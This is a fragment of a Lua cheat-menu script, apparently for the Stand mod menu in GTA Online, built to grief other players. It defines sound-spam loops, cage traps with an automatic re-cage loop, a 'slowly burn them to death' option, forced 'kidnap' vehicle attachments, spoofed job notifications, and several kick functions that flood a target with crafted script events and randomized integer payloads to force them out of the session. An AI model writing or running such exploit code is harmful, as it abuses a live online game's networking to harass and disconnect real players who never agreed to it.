    local playerMain = menu.list(griefing, "Sounds", {}, "")
    local playerPos = getEntityCoords(getPlayerPed(pid))
    local playerPed = getPlayerPed(pid)
    for i = 1, #SoundAnnoy do
        menu.action(playerMain, SoundAnnoy[i][1], {"kSounds_" .. SoundAnnoy[i][1]}, "", function()
            local snd, aud
            snd = tostring(SoundAnnoy[i][1])
            aud = tostring(SoundAnnoy[i][2])
           -- AUDIO.PLAY_SOUND_FROM_COORD(-1, snd, playerPos.x, playerPos.y, playerPos.z, aud, true, 50, true)
           AUDIO.PLAY_SOUND_FROM_ENTITY(-1, snd, playerPed, aud, true, true)
        end)
        menu.toggle_loop(playerMain, SoundAnnoy[i][1], {""}, "", function ()
            local snd, aud
            snd = tostring(SoundAnnoy[i][1])
            aud = tostring(SoundAnnoy[i][2])
            --AUDIO.PLAY_SOUND_FROM_COORD(-1, snd, playerPos.x, playerPos.y, playerPos.z, aud, true, 50, true)
            AUDIO.PLAY_SOUND_FROM_ENTITY(-1, snd, playerPed, aud, true, true)
        end)
    end
end

local soundsList = menu.list(griefing, "Play Sounds throughout the map.", {"sounds", "soundslist", "soundannoy"}, "A list of sounds that can be played throughout the entire freemode lobby. Sounds provided by Moist through his MoistScript.")

menu.action(soundsList, "Stop all sounds", {"stopall", "stopallsounds"}, "Stops all sounds. Credit to [hungwy] on the Stand discord for telling me the method.", function ()
    for i=0,99 do
       AUDIO.STOP_SOUND(i)
       AUDIO.RELEASE_SOUND_ID(i)
       util.yield() 
    end
end)
for i = 1, #SoundAnnoy do
    menu.action(soundsList, SoundAnnoy[i][1], {"allsounds"}, "", function()
        local snd, aud
        snd = tostring(SoundAnnoy[i][1])
        aud = tostring(SoundAnnoy[i][2])
        AudioAnnoyance(snd, aud)
    end)


    menu.toggle_loop(soundsList, SoundAnnoy[i][1], {"toggleallsounds"}, "", function ()
        local snd, aud
        snd = tostring(SoundAnnoy[i][1])
        aud = tostring(SoundAnnoy[i][2])
        AudioAnnoyance(snd, aud)
    end)
end

menu.toggle(cage_options, "Toggle All", {"toggleallcages"}, "", function(on_toggle)
    if on_toggle then
        menu.trigger_commands("basketcage" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("simplecage" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("foodtruckcage" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("doghousecage" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("jollycage" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("jollycage2" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("jollycage3" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("safecage" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("trashcage" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("moneycage" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("stuntcage" .. players.get_name(pid))
        util.yield(100)

    else
        menu.trigger_commands("basketcage" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("simplecage" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("foodtruckcage" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("doghousecage" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("jollycage" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("jollycage2" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("jollycage3" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("safecage" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("trashcage" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("moneycage" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("stuntcage" .. players.get_name(pid))
        util.yield(100)
        end
    end)

    menu.toggle_loop(cage_options, "Arcade Basketball", {"basketcage"}, "", function()
        if pid ~= players.user() then
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
		STREAMING.REQUEST_MODEL(2769149392)

		while not STREAMING.HAS_MODEL_LOADED(2769149392) do		
			util.yield()
		end
		local cage_object = OBJECT.CREATE_OBJECT(2769149392, pos.x, pos.y, pos.z, true, true, false)
		cages[#cages + 1] = cage_object
		util.yield(15)
		local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
		rot.y = 0
		ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
        end
	end)
    
	menu.toggle_loop(cage_options, "Simple", {"simplecage"}, "", function()
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local pos = ENTITY.GET_ENTITY_COORDS(player_ped) 
		if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
			menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." on")
			util.yield(300)
			if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
				--notification("Failed to kick player out of the vehicle", colors.red)
				menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
				return
			end
			menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
			pos =  ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) --if not it could place the cage at the wrong position
		end
		cage_player(pos)
	end)

---------------------------------------------------------------------------------------------------------------------------------
	
	menu.toggle_loop(cage_options, "First Job", {"foodtruckcage"}, "", function()
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
		local hash = 4022605402
		STREAMING.REQUEST_MODEL(hash)

		while not STREAMING.HAS_MODEL_LOADED(hash) do		
			util.yield()
		end
		local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
		cages[#cages + 1] = cage_object
		util.yield(15)

		--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
		--rot.y = 90
		--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
	end)

---------------------------------------------------------------------------------------------------------------------------------
	
menu.toggle_loop(cage_options, "Married Simulator", {"doghousecage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = -1782242710
	STREAMING.REQUEST_MODEL(hash)
	
	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z, true, true, false)
	cages[#cages + 1] = cage_object
	util.yield(15)

	--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	--rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)

---------------------------------------------------------------------------------------------------------------------------------

	
menu.toggle_loop(cage_options, "Christmas Time", {"jollycage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = 238789712
	STREAMING.REQUEST_MODEL(hash)
	
	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
	cages[#cages + 1] = cage_object
	util.yield(15)

	--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	--rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)

---------------------------------------------------------------------------------------------------------------------------------

	
menu.toggle_loop(cage_options, "Christmas Time v2", {"jollycage2"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("ch_prop_tree_02a")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	util.yield(15)
	--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	--rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)

---------------------------------------------------------------------------------------------------------------------------------

menu.toggle_loop(cage_options, "Christmas Time v3", {"jollycage3"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("ch_prop_tree_03a")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	util.yield()
	--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	--rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)

---------------------------------------------------------------------------------------------------------------------------------

menu.toggle_loop(cage_options, "'Safe' Space", {"safecage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = 1089807209
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - 1, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + 1, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + 1, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - 1, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) -- above
	cages[#cages + 1] = cage_object

	--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	--rot.y = 90

	ENTITY.FREEZE_ENTITY_POSITION(cage_object, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object2, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object3, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object4, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object5, true)
	util.yield(15)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)

---------------------------------------------------------------------------------------------------------------------------------

menu.toggle_loop(cage_options, "Average X-Force User", {"trashcage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = 684586828
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z, true, true, false)
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + 1, true, true, false)
	cages[#cages + 1] = cage_object
	util.yield(15)
	--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	--rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)

---------------------------------------------------------------------------------------------------------------------------------

menu.toggle_loop(cage_options, "money cage", {"moneycage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("bkr_prop_moneypack_03a")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z, true, true, false) -- right

	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z + .25, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z + .25, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z + .25, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z + .25, true, true, false) -- right

	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	util.yield(15)
	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)

----------------------------------------------------------------------------------------------------------------------------------

	menu.toggle_loop(cage_options, "Stunt Tube", {"stuntcage"}, "", function()
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
		STREAMING.REQUEST_MODEL(2081936690)

		while not STREAMING.HAS_MODEL_LOADED(2081936690) do		
			util.yield()
		end
		local cage_object = OBJECT.CREATE_OBJECT(2081936690, pos.x, pos.y, pos.z, true, true, false)
		cages[#cages + 1] = cage_object
		util.yield(15)
		local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
		rot.y = 90
		ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
	end)
							
	local cage_loop = false
	menu.toggle(cage_options, "automatic", {"autocage"}, "Cage them in a trap. If they get out... Do it again. No, I'll do it for you actually", function(on)
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local a = ENTITY.GET_ENTITY_COORDS(player_ped) --first position
		cage_loop = on
		if cage_loop then
			if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
				menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." on")
				util.yield(300)
				if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
					--notification("Failed to kick player out of the vehicle", colors.red)
					menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
					return
				end
				menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
				a =  ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
			end
			cage_player(a)
		end
		while cage_loop do
			local b = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) --current position
			local ba = {x = b.x - a.x, y = b.y - a.y, z = b.z - a.z} 
			if math.sqrt(ba.x * ba.x + ba.y * ba.y + ba.z * ba.z) >= 4 then --now I know there's a native to find distance between coords but I like this >_<
				a = b
				if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
					goto continue
				end
				cage_player(a)
				--notification(PLAYER.GET_PLAYER_NAME(pid).." was out of the cage. Doing it again", colors.red)
				::continue::
			end
			util.yield(1000)
		end
	end)



	
menu.action(cage_options, "Slowly Burn Them To Death", {}, "use this to slowly kill the poor caged person (ONLY WORKS WITH SOME CAGES)", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("prop_beach_fire")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do
		STREAMING.REQUEST_MODEL(hash)	
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1.75, true, true, false) -- front

	cages[#cages + 1] = cage_object

	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	rot.y = 90
end)


	menu.action(cage_options, "Release Player", {"release"}, "Attempts to delete spawned cages, for more complicated traps it will delete one side.", function() -- ez fix but lazy
		for key, value in pairs(cages) do
			entities.delete_by_handle(value)
		end
	end)

    menu.action(griefing, "Job SmS --notification", {"jobnotify"}, "It sends messages to anyone message appears like you started a job with notif above mini map, you may be kicked if you use on modders when not host.", function(cl)
        menu.show_command_box_click_based(cl, "jobnotify "..players.get_name(pid):lower().." ") end, function(input)
            local event_data = {0x8E38E2DF, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}
            input = input:sub(1, 127)
            for i = 0, #input -1 do
                local slot = i // 8
                local byte = string.byte(input, i + 1)
                event_data[slot + 3] = event_data[slot + 3] | byte << ((i-slot * 8)* 8)
            end
            util.trigger_script_event(1 << pid, event_data)
        end)

        local Cargobob_Kidnaps = menu.list(griefing, "Kidnaps")

	menu.action(Cargobob_Kidnaps,"Deliver Player to you", {"deliver"}, "Kidnaps the target and brings them to your current location", function()
		V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

		if table_kidnap == nil then
			table_kidnap = {}
		end

        hash = util.joaat("stockade")
        ped_hash = util.joaat("MP_M_Cocaine_01")

        if STREAMING.IS_MODEL_A_VEHICLE(hash) then
            STREAMING.REQUEST_MODEL(hash)

            while not STREAMING.HAS_MODEL_LOADED(hash) do
                util.yield()
            end

            coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)

            local aab = 
			{
				x = -5784.258301,
				y = -8289.385742,
				z = -136.411270
			}


            ENTITY.SET_ENTITY_VISIBLE(ped_to_kidnap, false)
            ENTITY.FREEZE_ENTITY_POSITION(ped_to_kidnap, true)

            table_kidnap[veh_to_attach] = entities.create_vehicle(hash, ENTITY.GET_ENTITY_COORDS(V3, true),
            CAM.GET_FINAL_RENDERED_CAM_ROT(0).z)
            while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
                STREAMING.REQUEST_MODEL(ped_hash)
                util.yield()
            end
            ped_to_kidnap = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
            ped_to_drive = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
			local PlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
			local PedCoords = ENTITY.GET_ENTITY_COORDS(PlayerPed)
            ENTITY.SET_ENTITY_INVINCIBLE(ped_to_drive, true)
            ENTITY.SET_ENTITY_INVINCIBLE(table_kidnap[veh_to_attach], true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(table_kidnap[veh_to_attach], ped_to_kidnap, 0, 0, 1, -1, 0, 0, 0, false,
                true, true, false, 0, false)
            ENTITY.SET_ENTITY_COORDS(ped_to_kidnap, coords_ped.x, coords_ped.y, coords_ped.z - 1, false, false, false,
                false)
            PED.SET_PED_INTO_VEHICLE(ped_to_drive, table_kidnap[veh_to_attach], -1)
            --TASK.TASK_VEHICLE_DRIVE_WANDER(ped_to_drive, table_kidnap[veh_to_attach], 20, 16777216)
			TASK.TASK_VEHICLE_DRIVE_TO_COORD(ped_to_drive, table_kidnap[veh_to_attach], PedCoords.x, PedCoords.y, PedCoords.z, 30, 1, hash, 4, 5, 0)

            util.yield(500)

            entities.delete_by_handle(ped_to_kidnap)
            veh_to_attach = veh_to_attach + 1

            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)
            --util.toast(os.date("%H:%M:%S") .. " DONE", TOAST_ABOVE_MAP)
        end
	end)


    menu.action(Cargobob_Kidnaps,"Special Delivery", {"specialdeliver"}, "Puts the player inside a cargobob.", function()
		V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		if table_kidnap == nil then
			table_kidnap = {}
		end
        hash = util.joaat("Cargobob3")
        ped_hash = util.joaat("MP_M_Counterfeit_01")
        if STREAMING.IS_MODEL_A_VEHICLE(hash) then
            STREAMING.REQUEST_MODEL(hash)
            while not STREAMING.HAS_MODEL_LOADED(hash) do
                util.yield()
            end
            coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)
            local aab = 
			{
				x = -5784.258301,
				y = -8289.385742,
				z = -136.411270
			}
            ENTITY.SET_ENTITY_VISIBLE(ped_to_kidnap, false)
            ENTITY.FREEZE_ENTITY_POSITION(ped_to_kidnap, true)
            table_kidnap[veh_to_attach] = entities.create_vehicle(hash, ENTITY.GET_ENTITY_COORDS(V3, true),
            CAM.GET_FINAL_RENDERED_CAM_ROT(0).z)
            while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
                STREAMING.REQUEST_MODEL(ped_hash)
                util.yield()
            end
            ped_to_kidnap = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
            ped_to_drive = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
			local PlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
			local PedCoords = ENTITY.GET_ENTITY_COORDS(PlayerPed)
            ENTITY.SET_ENTITY_INVINCIBLE(ped_to_drive, true)
            ENTITY.SET_ENTITY_INVINCIBLE(table_kidnap[veh_to_attach], true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(table_kidnap[veh_to_attach], ped_to_kidnap, 0, 0, 1, -1, 0, 0, 0, false,
                true, true, false, 0, false)
            ENTITY.SET_ENTITY_COORDS(ped_to_kidnap, coords_ped.x, coords_ped.y, coords_ped.z - 1, false, false, false,
                false)
            PED.SET_PED_INTO_VEHICLE(ped_to_drive, table_kidnap[veh_to_attach], -1)
            -- TASK.TASK_VEHICLE_DRIVE_WANDER(ped_to_drive, table_kidnap[veh_to_attach], 20, 16777216)
			TASK.TASK_VEHICLE_DRIVE_TO_COORD(ped_to_drive, table_kidnap[veh_to_attach], PedCoords.x, PedCoords.y, PedCoords.z, 30, 1, hash, 4, 5, 0)
            util.yield(500)
            entities.delete_by_handle(ped_to_kidnap)
            veh_to_attach = veh_to_attach + 1
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)
        end
	end)

-----------------------------------------------------------------------------------------------------------------------------------------

        crash = menu.list(menu.player_root(pid), "Crashes", {}, "Addict Crash", function(); end)
        
        kick = menu.list(menu.player_root(pid), "Kicks", {}, "Network Bail", function(); end)

        menu.action(kick, "Blast Kick", {"blast"}, "Blocks the player join reaction then uses every kick in my script and stand, 22 kicks total but smart kick could have more than 1 kick also.", function()
        --notification("Blast kick sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            menu.trigger_commands("historyblock " .. players.get_name(pid))
            menu.trigger_commands("boop" .. players.get_name(pid))
            menu.trigger_commands("buttplug" .. players.get_name(pid))
    	end, nil, nil, COMMANDPERM_AGGRESSIVE)

        menu.action(kick, "Boop Kick", {"boop"}, "Contains 6 SE kicks if breakup won't work.", function()
            menu.trigger_commands("breakup" .. players.get_name(pid))
            menu.trigger_commands("givesh" .. players.get_name(pid))
            util.trigger_script_event(1 << pid, {697566862, pid, 0x4, -1, 1, 1, 1}) --697566862 Give Collectible
            util.trigger_script_event(1 << pid, {1268038438, pid, memory.script_global(2657589 + 1 + (pid * 466) + 321 + 8)}) 
            util.trigger_script_event(1 << pid, {915462795, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (pid * 0x257) + 0x1FE))})
            util.trigger_script_event(1 << pid, {697566862, pid, 0x4, -1, 1, 1, 1})
            util.trigger_script_event(1 << pid, {1268038438, pid, memory.script_global(2657589 + 1 + (pid * 466) + 321 + 8)})
            util.trigger_script_event(1 << pid, {915462795, players.user(), memory.read_int(memory.script_global(1894573 + 1 + (pid * 608) + 510))})
        end, nil, nil, COMMANDPERM_AGGRESSIVE)


            menu.toggle_loop(kick, "Invalid Apartment Kick V1", {"invkick1"}, "Invalid Apartment Invite.", function(on_toggle)
               local int_min = -2147483647
               local int_max = 2147483647
               for i = 1, 15 do
                   util.trigger_script_event(1 << pid, {-168599209, 4, -106354710, 1957299332, 1, 115, 2037557198, -1322654879, -1220141674, math.random(int_min, int_max), math.random(int_min, int_max), 
                   math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                   math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                   util.trigger_script_event(1 << pid, {-168599209, 4, -106354710, 1957299332, 1, 115, 2037557198, -1322654879, -1220141674})
               end
               menu.trigger_commands("givesh" .. players.get_name(pid))
               util.yield()
               for i = 1, 15 do
                   util.trigger_script_event(1 << pid, {-168599209, 4, -106354710, 1957299332, 1, 115, 2037557198, -1322654879, -1220141674, pid, math.random(int_min, int_max)})
                   util.trigger_script_event(1 << pid, {-168599209, 4, -106354710, 1957299332, 1, 115, 2037557198, -1322654879, -1220141674})
                   util.trigger_script_event(1 << pid, {-168599209, 4, -106354710, 1957299332, 1, 115, 2037557198, -1322654879, -1220141674})
               end
            end, nil, nil, COMMANDPERM_AGGRESSIVE)
   
           menu.toggle_loop(kick, "Invalid Apartment Kick V2", {"invkick2"}, "Invalid Apartment Invite.", function(on_toggle)
               local int_min = -2147483647
               local int_max = 2147483647
               for i = 1, 5 do
                   util.trigger_script_event(1 << pid, {-168599209, 4, 827588970, 828619960, 1, 115, 330139908, -2089816692, -2142984085, math.random(int_min, int_max), math.random(int_min, int_max), 
                   math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                   math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                   util.trigger_script_event(1 << pid, {-168599209, 4, 827588970, 828619960, 1, 115, 330139908, -2089816692, -2142984085})
               end
               menu.trigger_commands("givesh" .. players.get_name(pid))
               util.yield()
               for i = 1, 5 do
                   util.trigger_script_event(1 << pid, {-168599209, 4, 827588970, 828619960, 1, 115, 330139908, -2089816692, -2142984085, pid, math.random(int_min, int_max)})
                   util.trigger_script_event(1 << pid, {-168599209, 4, 827588970, 828619960, 1, 115, 330139908, -2089816692, -2142984085})
                   util.trigger_script_event(1 << pid, {-168599209, 4, 827588970, 828619960, 1, 115, 330139908, -2089816692, -2142984085})
                   util.yield(300)
               end
            end, nil, nil, COMMANDPERM_AGGRESSIVE)

        
            menu.toggle_loop(kick, "Array Kick V1", {"arraykickv1"}, "", function(on_toggle)
            local int_min = -2147483647
            local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << pid, {1279059857, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                util.trigger_script_event(1 << pid, {1279059857})
            end
            menu.trigger_commands("givesh" .. players.get_name(pid))
            util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << pid, {1279059857, pid, math.random(int_min, int_max)})
                util.trigger_script_event(1 << pid, {1279059857})
            end
        end)

        menu.toggle_loop(kick, "Array Kick V2", {"arraykickv2"}, "", function(on_toggle)
            array_kick(pid)
        end)

	menu.divider(kick, "Stand Kicks")

    	menu.action(kick, "Smart", {"smartkick"}, "Removes the player by any means necessary.", function()
	menu.trigger_commands("kick"..PLAYER.GET_PLAYER_NAME(pid))
    			end)

    	menu.action(kick, "Buttplug", {"buttplugkick"}, "Unblockable when you are the host.", function()
	menu.trigger_commands("buttplug"..PLAYER.GET_PLAYER_NAME(pid))
    			end)

    	menu.action(kick, "Breakup", {"breakupkick"}, "A discrete kick that won't tell the target who did it.", function()
	menu.trigger_commands("breakup"..PLAYER.GET_PLAYER_NAME(pid))
    			end)

